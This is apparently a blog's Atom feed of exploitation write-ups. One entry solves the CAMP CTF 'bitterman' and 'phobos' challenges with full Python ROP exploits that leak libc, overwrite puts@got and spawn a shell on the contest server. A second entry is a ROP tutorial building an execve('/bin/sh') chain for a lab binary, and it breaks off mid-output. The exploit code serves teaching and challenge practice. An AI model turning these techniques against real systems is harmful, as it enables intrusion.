<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Rop | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/rop/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-10-04T11:23:41+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Bitterman &amp; Phobos]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos/"/>
    <updated>2015-08-18T21:32:18+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-bitterman-and-phobos</id>
    <content type="html"><![CDATA[<p>I rolled into the CampCTF while Swappage was already working on it. He had started on bitterman, a 400 point challenge.</p>

<!--more-->


<p>We&rsquo;re given a 64-bit ELF binary and Swappage also managed to obtain the corresponding libc. Upon starting the binary, we&rsquo;re presented with the following:</p>

<pre><code class="bash">&gt; What's your name? 
BBBB
Hi, BBBB
x
&gt; Please input the length of your message: 
-1  
&gt; Please enter your text: 
LSJFLSDJF
&gt; Thanks!
</code></pre>

<p>The <code>x</code> after the <code>BBBB</code> in the above example was actually <code>0x7f</code>, so the binary is leaking part of an address (we later determined it to be a stack address). In the end, I couldn&rsquo;t make use of this, but it was interesting to see. Swappage already found the bugs: we can send a large message length and this will allow us to overflow a stack buffer. NX is enabled so it&rsquo;s ROP time!</p>

<p>Besides NX, ASLR is also enabled. This means we have to first leak a libc address to calculate libc&rsquo;s base address and then something like <code>system()</code>. I made use of the <code>puts@plt</code> to write out the contents of <code>puts@got</code>. The latter contains the libc address of <code>puts()</code>, which we can then receive. Superkojiman was able to find the one-shot RCE gadget. The ROP chain goes to <code>read@plt</code> and awaits our input. Upon receiving the address of the one-shot RCE gadget in libc, the ROP chain overwrites <code>puts@got</code> and restarts the binary from <code>main()</code>. This latter decision was based on using <code>system()</code> instead of the one-shot RCE gadget, but by the time I was done implementing the ROP chain, superkojiman had already supplied the offset. When <code>main()</code> restarts, one of the first functions it calls is <code>puts@plt</code>, which is now pointing to the shell-spawning one-shot RCE gadget. We land a shell and are happy!</p>

<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

payload = "A"*152   # ty Swappage!

'''
0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
0x00000296 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
0x00000060 : pop rbp; ret
'''

base = 0x400590
# prologue, needed for later! after the [call r12 + rbx*8], there is
# a cmp rbx, rbp. At this point, rbx is 1 and if rbp is not equal to rbx, 
# the code jumps back instead of leading to a ret!
# therefore, we set up rbp first. 
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

# first, we set up some registers, which will later be put in the correct registers
# puts() uses rdi as argument
payload += q(0x000002bc+base)
payload += q(0x600c50)  # value for r12 -&gt; puts@got
payload += q(0)         # value for r13 -&gt; goes into rdx 
payload += q(0)         # value for r14 -&gt; goes into rsi
payload += q(0x600c50)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()

# swap around the registers and call puts()
payload += q(0x00000296+base)
payload += q(0) * 7
# without this, we don't get output
payload += q(0x400570)  # fflush@plt

# now read() to overwrite printf()
# read() is blocking and will wait for our input :)
# again, first set up rbp
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

# set up registers/arguments for read()
payload += q(0x000002bc+base)
payload += q(0x600c60)  # value for r12 -&gt; read@got
payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
payload += q(0x600c50)  # value for r14 -&gt; goes into rsi -&gt; overwrite puts@got
payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin

payload += q(0x00000296+base)
payload += q(0) * 7

# restart main(), so the binary will execute puts() -&gt; one shot rce, lands a shell
# could've just a easily return to puts@plt...
payload += q(0x4006ec) 

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10103))

    readtil('name?')
    s.send('a\n')
    readtil('message:')
    s.send('-1\n')   # ty Swappage!
    readtil('text:')
    s.send(payload+'\n')

    readtil('Thanks!\n')
    data = s.recv(8)
    data = data[:-1] + "\x00\x00"
    puts_addr = struct.unpack('&lt;Q', data)[0]
    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])

    libc_base = puts_addr - 0x70a30
    print "[+] libc base addr: " + hex(libc_base)
    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"

    # the rop chain will wait at read(), because that is blocking
    # send the address to overwrite puts@got
    s.send(q(system_addr))

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
</code></pre>

<p>The reason for setting up <code>rbp</code>:</p>

<pre><code>  400839:   call   QWORD PTR [r12+rbx*8]
  40083d:   add    rbx,0x1
  400841:   cmp    rbx,rbp  ; if rbx != rbp, we jump back!
  400844:   jne    400830 
  400846:   add    rsp,0x8  ; we wanna go here!
  40084a:   pop    rbx
  40084b:   pop    rbp
  40084c:   pop    r12
  40084e:   pop    r13
  400850:   pop    r14
  400852:   pop    r15
  400854:   ret    
</code></pre>

<p>And the exploit in action:</p>

<pre><code class="bash">[+] Leaked puts(): 0x7fb9d6487a30
[+] libc base addr: 0x7fb9d6417000
[+] sending one shot rce addr (0x7fb9d645b2aa)
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
whoami
challenge
ls -alh
total 40K
drwxr-xr-x 2 root root 4.0K Aug 13 13:46 .
drwxr-xr-x 3 root root 4.0K Aug  5 21:43 ..
-rw-r--r-- 1 root root  220 Aug  5 19:55 .bash_logout
-rw-r--r-- 1 root root 3.7K Aug  5 19:55 .bashrc
-rw-r--r-- 1 root root  675 Aug  5 19:55 .profile
-rwxr-xr-x 1 root root  11K Aug 12 01:28 bitterman
-rw-r--r-- 1 root root   43 Aug 13 13:47 flag.txt
-rwxr-xr-x 1 root root   64 Aug 12 01:34 run.sh
cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80  -
</code></pre>

<h2>Phobos</h2>

<p>Next, we turned to phobos for 300 points, which is nearly the same binary but without NX! After a few small changes to the previous exploit, we obtained the flag for phobos as well:</p>

<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

payload = "A"*136   # ty Swappage!

'''
0x000002bc : pop r12; pop r13; pop r14; pop r15; ret
0x000002b6 : xor ebx, ebx; nop [rax + rax]; mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]
0x00000060 : pop rbp; ret
'''

base = 0x400590
# prologue, needed for later!
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

payload += q(0x000002dc+base)
payload += q(0x600c70)  # value for r12 -&gt; puts@got
payload += q(0)         # value for r13 -&gt; goes into rdx 
payload += q(0)         # value for r14 -&gt; goes into rsi
payload += q(0x600c70)  # value for r15 -&gt; goes into rdi -&gt; leak addr of puts()

payload += q(0x000002b6+base)
payload += q(0) * 7
payload += q(0x400570)  # fflush@plt

# now read() to overwrite printf()
payload += q(0x00000060+base)   # pop rbp ; ret
payload += q(1) # value for rbp

payload += q(0x000002dc+base)
payload += q(0x600c80)  # value for r12 -&gt; read@got
payload += q(8)         # value for r13 -&gt; goes into rdx -&gt; count
payload += q(0x600c70)  # value for r14 -&gt; goes into rsi -&gt; overwrite printf()
payload += q(0)         # value for r15 -&gt; goes into rdi -&gt; 0 -&gt; stdin

payload += q(0x000002b6+base)
payload += q(0) * 7

payload += q(0x4006ec) # restart, so the binary will execute puts() -&gt; one shot rce, lands a shell

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10106))
    #s.connect(('localhost', 4444))

    print readtil('name?')
    s.send('a\n')
    print readtil('message:')
    s.send('-1\n')   # ty Swappage!
    print readtil('text:')
    s.send(payload+'\n')
    print readtil('Thanks!\n')

    data = s.recv(8)
    data = data[:-1] + "\x00\x00"

    puts_addr = struct.unpack('&lt;Q', data)[0]
    print "[+] Leaked puts(): " + hex(struct.unpack('&lt;Q', data)[0])
    libc_base = puts_addr - 0x70a30
    print "[+] libc base addr: " + hex(libc_base)
    system_addr = libc_base + 0x442AA # one shot rce, ty superkojiman!
    print "[+] sending one shot rce addr (" + hex(system_addr) + ")"

    s.send(q(system_addr))

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
pwn()
</code></pre>

<p>And in action:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/phobos$ python poc2.py 
&gt; What's your name?

Hi, a
&lt;randomjunk&gt;
&gt; Please input the length of your message:

&gt; Please enter your text:

&gt; Thanks!

[+] Leaked puts(): 0x7fa6830dda30
[+] libc base addr: 0x7fa68306d000
[+] sending one shot rce addr (0x7fa6830b12aa)
id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
cat flag.txt
CAMP15_0ae754f04a8782cba9a7ec2c69dc1274
</code></pre>

<p>It&rsquo;s quite nice to solve a 400 point challenge only to find out we can use nearly the same solution for an additional 300 points!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer - Level0]]></title>
    <link href="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/"/>
    <updated>2015-06-28T19:45:38+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/06/28/rop-primer-level0</id>
    <content type="html"><![CDATA[<p>The ROP VM which I made for this exercise can be downloaded from <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">vulnhub.com</a>. Version 0.2 is fixed, as the home dirs had improper permissions (thanks to faleur and marky for notifying me). We&rsquo;re up against the binary <code>level0</code>. In this case, we have the source code, which helps tremendously. Nevertheless, start by treating it as a blackbox.</p>

<!--more-->


<p>First, enable coredumps.</p>

<pre><code class="bash">seb@minol:~/tmp$ ulimit -c unlimited
</code></pre>

<p>Then, make sure you&rsquo;re not running the exploits against a SUID binary. Linux, by default, will <em>not</em> generate coredumps for SUID binaries. Fair enough. Thanks to @Swappage for alerting me during the workshop!</p>

<pre><code class="bash">seb@minol:~/tmp$ # remember, coredumps don't work on suid binaries
seb@minol:~/tmp$ # so cp ./level0 (suid level1) to ./level0b
</code></pre>

<p>Finally, disassemble the binary with <code>objdump</code>:</p>

<pre><code class="bash">seb@minol:~/tmp$ objdump -d -M intel ./level0 &gt; level0.out
seb@minol:~/tmp$ # -M intel will use the Intel syntax instead of AT&amp;T's syntax.
</code></pre>

<p>In some cases, the binary is the only thing given, with no source code available. The disassembly will help to get an understanding of what the binary is doing.</p>

<p>Another useful command is <code>file</code>:</p>

<pre><code class="bash">seb@minol:~/tmp$ file ./level0
./level0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=0x52c391fb68f9d0b47e49220dfe408334f8fdd088, not stripped
</code></pre>

<p>This tells us that the binary is 32 bit and statically linked, which explains its large size.</p>

<p>Let&rsquo;s have a look at the disassembly of <code>main()</code>:</p>

<pre><code>08048254 &lt;main&gt;:
 8048254:       55                      push   ebp
 8048255:       89 e5                   mov    ebp,esp
 8048257:       83 e4 f0                and    esp,0xfffffff0
 804825a:       83 ec 30                sub    esp,0x30
 804825d:       c7 04 24 68 b6 0a 08    mov    DWORD PTR [esp],0x80ab668
 8048264:       e8 d7 0c 00 00          call   8048f40 &lt;_IO_puts&gt;
 8048269:       c7 04 24 80 b6 0a 08    mov    DWORD PTR [esp],0x80ab680
 8048270:       e8 0b 0b 00 00          call   8048d80 &lt;_IO_printf&gt;
 8048275:       8d 44 24 10             lea    eax,[esp+0x10]
 8048279:       89 04 24                mov    DWORD PTR [esp],eax
 804827c:       e8 2f 0b 00 00          call   8048db0 &lt;_IO_gets&gt;
 8048281:       8d 44 24 10             lea    eax,[esp+0x10]
 8048285:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048289:       c7 04 24 98 b6 0a 08    mov    DWORD PTR [esp],0x80ab698
 8048290:       e8 eb 0a 00 00          call   8048d80 &lt;_IO_printf&gt;
 8048295:       b8 00 00 00 00          mov    eax,0x0
 804829a:       c9                      leave  
 804829b:       c3                      ret    
</code></pre>

<p>We have a classic buffer overflow situation here:</p>

<pre><code> 8048275:       8d 44 24 10             lea    eax,[esp+0x10]
 8048279:       89 04 24                mov    DWORD PTR [esp],eax
 804827c:       e8 2f 0b 00 00          call   8048db0 &lt;_IO_gets&gt;
</code></pre>

<p>The <code>lea</code> command will load a stack address into <code>eax</code>. That address is put on the stack as an argument for <code>_IO_gets</code>, which will happily read more than enough bytes from STDIN to overflow the buffer and overwrite the saved return address on the stack.</p>

<p>Let&rsquo;s switch to <code>gdb-peda</code> and see the binary in action.</p>

<pre><code class="bash">seb@minol:~/tmp$ # gdb -q is quiet startup, so it won't print out lots of info. Not strictly necessary. 
seb@minol:~/tmp$ gdb ./level0 -q
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
</code></pre>

<p><code>checksec</code> is a very useful command available in <code>gdb-peda</code> (not in vanilla <code>gdb</code>). In this case, one can see that only NX is enabled, meaning that the stack, heap and other data sections are not executable, whereas code sections are executable but not writeable. Let&rsquo;s check this within <code>gdb</code>. First, enter <code>start</code> to run the binary and break at the <code>main()</code> function automatically. Then, inspect the memory layout with <code>vmmap</code>, which will show memory regions that are active in memory along with their memory protection flags.</p>

<pre><code class="bash">gdb-peda$ start
[----------------------------------registers-----------------------------------]
EAX: 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
EBX: 0x0 
ECX: 0x1 
EDX: 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x193a5dce 
EBP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
ESP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
EIP: 0x8048257 (&lt;main+3&gt;:   and    esp,0xfffffff0)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804824f &lt;frame_dummy+63&gt;:  jmp    0x80481a0 &lt;register_tm_clones&gt;
   0x8048254 &lt;main&gt;:    push   ebp
   0x8048255 &lt;main+1&gt;:  mov    ebp,esp
=&gt; 0x8048257 &lt;main+3&gt;:  and    esp,0xfffffff0
   0x804825a &lt;main+6&gt;:  sub    esp,0x30
   0x804825d &lt;main+9&gt;:  mov    DWORD PTR [esp],0x80ab668
   0x8048264 &lt;main+16&gt;: call   0x8048f40 &lt;puts&gt;
   0x8048269 &lt;main+21&gt;: mov    DWORD PTR [esp],0x80ab680
[------------------------------------stack-------------------------------------]
0000| 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
0004| 0xbffff61c --&gt; 0x8048445 (&lt;__libc_start_main+421&gt;:    mov    DWORD PTR [esp],eax)
0008| 0xbffff620 --&gt; 0x1 
0012| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
0016| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
0020| 0xbffff62c --&gt; 0x0 
0024| 0xbffff630 --&gt; 0x0 
0028| 0xbffff634 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x08048257 in main ()
gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x080ca000 r-xp  /home/seb/tmp/level0
0x080ca000 0x080cb000 rw-p  /home/seb/tmp/level0
0x080cb000 0x080ef000 rw-p  [heap]
0xb7fff000 0xb8000000 r-xp  [vdso]
0xbffdf000 0xc0000000 rw-p  [stack]
</code></pre>

<p>The output of <code>vmmap</code> clearly shows NX in effect: the stack is marked writeable but not executable; the binary, loaded at 0x8048000, is marked executable but not writeable.</p>

<p>So far, so good. Let&rsquo;s continue to run the binary with <code>c</code> and try to overwrite the saved return address on the stack, taking advantage of the <code>_IO_gets</code> call. Note: you can use a patterned buffer for this as well, check out <code>pattern_create</code> and <code>pattern_offset</code> in gdb-peda.</p>

<pre><code class="bash">gdb-peda$ c
[+] ROP tutorial level0
[+] What's your name? AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL
[+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
EDX: 0x80cb690 --&gt; 0x0 
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x687af80d 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xbffff620 --&gt; 0x0 
EIP: 0x4c4c4c4c ('LLLL')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x4c4c4c4c
[------------------------------------stack-------------------------------------]
0000| 0xbffff620 --&gt; 0x0 
0004| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
0008| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
0012| 0xbffff62c --&gt; 0x0 
0016| 0xbffff630 --&gt; 0x0 
0020| 0xbffff634 --&gt; 0x0 
0024| 0xbffff638 --&gt; 0x0 
0028| 0xbffff63c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x4c4c4c4c in ?? ()
</code></pre>

<p>Lucky shot. <code>eip</code> loaded with <code>LLLL</code> because we&rsquo;ve overwritten the return address for <code>main()</code> on the stack. As soon as the <code>ret</code> at the end of <code>main()</code> was executed, it popped the value off of the top of the stack into <code>eip</code> and increased <code>esp</code> with four. Because we&rsquo;ve overwritten that value, we now control <code>eip</code>. To have a look at the stack, issue the following command:</p>

<pre><code>gdb-peda$ x/20wx $esp-48
0xbffff5f0: 0x41414141  0x42424242  0x43434343  0x44444444
0xbffff600: 0x45454545  0x46464646  0x47474747  0x48484848
0xbffff610: 0x49494949  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c
0xbffff620: 0x00000000  0xbffff6b4  0xbffff6bc  0x00000000
0xbffff630: 0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p><code>x</code> stands for inspect, with the format specifier and amount after the slash (in this case, 20 DWORDS). Finally, give it the address from which you want to inspect. In this case, I chose <code>$esp-48</code>, which is the start of the buffer on the stack. Confirm that this is our input.</p>

<p>So let&rsquo;s use this first bit of information and write a script to reliably overwrite the saved return address on the stack. This will serve as the skeleton for our exploit.</p>

<pre><code class="python">import struct

# this is a helper function, which will take a 32-bit value and convert it to little-endian.
def p(x):
    return struct.pack('&lt;L', x)

# start our payload as a string of character.
payload = ""

# add padding to overwrite upto the saved return address.
payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

# this part should overwrite the saved return address on the stack.
payload += p(0xdeadbeef)

# make sure to output the rop chain.
print payload
</code></pre>

<p>To verify that this will return to <code>0xdeadbeef</code> by overwriting the saved return address, we have two options:</p>

<ol>
<li>run it outside of gdb and inspect the coredump that is generated</li>
<li>run it, store the rop chain in a file and run the binary in gdb with the file as input</li>
</ol>


<h2>Method 1</h2>

<p>Running the exploit in this way is the most accurate way, at least as far as memory layout and stack addresses are concerned. There might be a discrepancy between memory addresses when running within <code>gdb</code> vs outside of <code>gdb</code>. There is a way to fix this, using <a href="">fixenv</a>: I did not know of this solution until BSides!
<code>``bash
seb@minol:~/tmp$ python poc.py | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
Segmentation fault (core dumped)
seb@minol:~/tmp$ gdb -q ./level0 core
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
[New LWP 2922]
Core was generated by</code>./level0&#8217;.
Program terminated with signal 11, Segmentation fault.</p>

<h1>0  0xdeadbeef in ?? ()</h1>

<p>gdb-peda$
&#8220;`</p>

<h2>Method 2</h2>

<p>This method is especially useful if you need to inspect the memory with <code>vmmap</code>: <code>gdb</code> cannot display memory layout of a coredump!</p>

<pre><code class="bash">seb@minol:~/tmp$ python poc.py &gt; input_for_bin
seb@minol:~/tmp$ gdb -q ./level0
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ r &lt; input_for_bin 
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
EDX: 0x80cb690 --&gt; 0x0 
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x88c01b86 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xbffff620 --&gt; 0x0 
EIP: 0xdeadbeef
EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0xdeadbeef
[------------------------------------stack-------------------------------------]
0000| 0xbffff620 --&gt; 0x0 
0004| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7e9 ("/home/seb/tmp/level0")
0008| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7fe ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
0012| 0xbffff62c --&gt; 0x0 
0016| 0xbffff630 --&gt; 0x0 
0020| 0xbffff634 --&gt; 0x0 
0024| 0xbffff638 --&gt; 0x0 
0028| 0xbffff63c --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xdeadbeef in ?? ()
</code></pre>

<p>Regardless of which method is used, <code>eip</code> now points at <code>0xdeadbeef</code>, which confirms that our proof-of-concept exploit works as intended. We can now start extending the ROP chain to start doing useful things.</p>

<p>In the workshop, I showed the mprotect/read/ret to shellcode strategy. In this writeup, I will use a different way to spawn a shell. We will need access to <code>execve</code> or <code>system()</code> for this.</p>

<p>A lot of students of the ROP workshop tried to find <code>system()</code>, fruitlessly:</p>

<pre><code class="bash">gdb-peda$ p system
No symbol table is loaded.  Use the "file" command.
</code></pre>

<p><code>system()</code> is not linked in this binary! There is, however, one <code>int 0x80; ret</code> gadget available, which we can use to build a ROP chain. During the workshop in London I showed the <code>mprotect</code> and <code>read</code> strategy. Now, I&rsquo;d like to show how to do an <code>execve</code> syscall using the ROP chain. For added fun, I&rsquo;ll assume that NULL bytes are badchars.</p>

<p>First, however, upload the binary to <a href="http://ropshell.com">ropshell.com</a> or use Your-Favorite-ROP-Gadget-Dumper.</p>

<p>One thing that is <em>absolutely</em> mandatory is access to a gadget that does a syscall. ropshell.com suggests <code>&gt; 0x08052cf0 : int 0x80; ret</code>. Sometimes, there might be another gadget where extra instructions are present between the <code>int</code> and the <code>ret</code>. This is usually fine and you can find them in ropshell.com by searching like this: <code>int 0x80 ?</code>. The extra <code>?</code> indicates that extra opcodes may be present.</p>

<p>Now that we have that all important gadget, we can start building the rest of the ROP chain. We&rsquo;ll need to set a couple of registers and build the argument for <code>execve</code> in memory.</p>

<p>For x86 syscalls, the arguments are passed in registers. <a href="http://syscalls.kernelgrok.com/">This website</a> contains a list of the syscalls and a short description of the arguments. For <code>execve</code>, we see this:</p>

<pre><code>eax = syscall number = 0x0b
ebx = pointer to filename to execute
ecx = pointer to argv
edx = pointer to envp
</code></pre>

<p>However, I was unable to get the exploit to work when <code>ecx</code> was pointing to a string. Instead, I opted to set <code>ecx</code> and <code>edx</code> to NULL. Let&rsquo;s start building this ROP chain, starting from the PoC. We will need to write out the string <code>/bin/sh</code> somewhere in memory. For this, we need two things:</p>

<ol>
<li>A location to write the string</li>
<li>A gadget that allows us to write out the string</li>
</ol>


<p>For #1, we can look at the output of vmmap in gdb-peda:</p>

<pre><code>gdb-peda$ vmmap
Start      End        Perm  Name
0x08048000 0x080ca000 r-xp  /home/seb/tmp/level0
0x080ca000 0x080cb000 rw-p  /home/seb/tmp/level0
0x080cb000 0x080ef000 rw-p  [heap]
0xb7fff000 0xb8000000 r-xp  [vdso]
0xbffdf000 0xc0000000 rw-p  [stack]
</code></pre>

<p>ASLR is disabled, but taking the heap or stack is not my favorite option. Instead, let&rsquo;s use <code>0x080ca000</code> to <code>0x080cb000</code>. This area is readable and writeable. Not executable but that doesn&rsquo;t matter, as we will not store shellcode there anyway.</p>

<p>For #2, ropshell.com has no good suggestions, as they are <code>add [r32], r32</code> instructions. If the memory contains values already, we&rsquo;ll not be able to write out the string reliably, unless the block of memory contains NULL bytes.</p>

<p>To avoid complications, I searched for <code>mov [?</code> in ropshell.com:</p>

<pre><code>ropshell&gt; search mov [?
found many, display max 256 gadgets
&gt; 0x0806bc2b : mov [ecx], 0x83; ret
&gt; 0x08071e79 : mov [ecx], 1; ret
&gt; 0x08079191 : mov [edx], eax; ret
&gt; 0x080a82e8 : mov [eax + 0x4c], edx; ret
&gt; 0x080a6544 : mov [ecx + 0x1fc0], 4; ret
&gt; 0x08076839 : mov [ecx + 0x83049a74], cl; ret
&gt; 0x08052fac : mov [ecx], 1; pop ebp; ret 4
&gt; 0x080499d2 : mov [ecx], eax; pop ebp; ret
&gt; 0x080526f6 : mov [ecx], edx; pop ebp; ret
</code></pre>

<p>I like <code>0x08079191 : mov [edx], eax; ret</code> a lot. It&rsquo;s only uses two registers and contains no unnecessary instructions. Let&rsquo;s see how we can set <code>edx</code> and <code>eax</code> to what we need.</p>

<pre><code>ropshell&gt; search pop r32
found 15 gadgets
&gt; 0x0806b893 : pop eax; ret
&gt; 0x080525ee : pop ebx; ret
&gt; 0x080525c6 : pop edx; ret
&gt; 0x0806a5c9 : pop esi; ret
&gt; 0x080516ad : pop edi; ret
&gt; 0x08048550 : pop ebp; ret
&gt; 0x08064630 : pop esp; ret
&gt; 0x080525ed : pop ecx; pop ebx; ret
</code></pre>

<p>Plenty of gadgets we can use. The plan is now to pop the address <code>0x080ca040</code> into <code>edx</code> and the value <code>/bin</code> into <code>eax</code>. The address is arbitrary, but chosen such that we don&rsquo;t overwrite anything important or that the address contains NULL bytes. Let&rsquo;s build the first PoC:</p>

<pre><code class="python">import struct

# this is a helper function, which will take a 32-bit value and convert it to little-endian.
def p(x):
    return struct.pack('&lt;L', x)

# start our payload as a string of character.
payload = ""

# add padding to overwrite upto the saved return address.
payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"

payload += p(0x080525c6)    # pop edx; ret
payload += p(0x080ca040)    # start writing here
payload += p(0x0806b893)    # pop eax; ret
payload += '/bin'           # first part of /bin/sh
payload += p(0x08079191)    # mov [edx], eax; ret

payload += p(0x080525c6)    # pop edx; ret
payload += p(0x080ca044)    # just after the first piece of '/bin'
payload += p(0x0806b893)    # pop eax; ret
payload += '/shX'           # we'll zero out the X in a moment
payload += p(0x08079191)    # mov [edx], eax; ret

payload += p(0x08097bff)    # xor eax, eax; ret (set eax to 0)
payload += p(0x080525c6)    # pop edx; ret
payload += p(0x080ca047)    # zero out the X, making the string NULL terminated
payload += p(0x08079191)    # mov [edx], eax; ret

payload += "AAAA"           # crash
print payload
</code></pre>

<p>Run it and expect the memory area:</p>

<pre><code>seb@minol:~/tmp$ python purepoc0.py &gt; input0
seb@minol:~/tmp$ gdb -q level0
Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
gdb-peda$ r &lt; input0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK�@�
              ��/bin��D�
                       ��/shX��{       �G�
                                         �AAAA!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
EDX: 0x80ca047 --&gt; 0x0 
ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
EDI: 0x6f23fbda 
EBP: 0x4b4b4b4b ('KKKK')
ESP: 0xbffff658 --&gt; 0x0 
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff658 --&gt; 0x0 
0004| 0xbffff65c --&gt; 0x0 
0008| 0xbffff660 --&gt; 0x0 
0012| 0xbffff664 --&gt; 0x0 
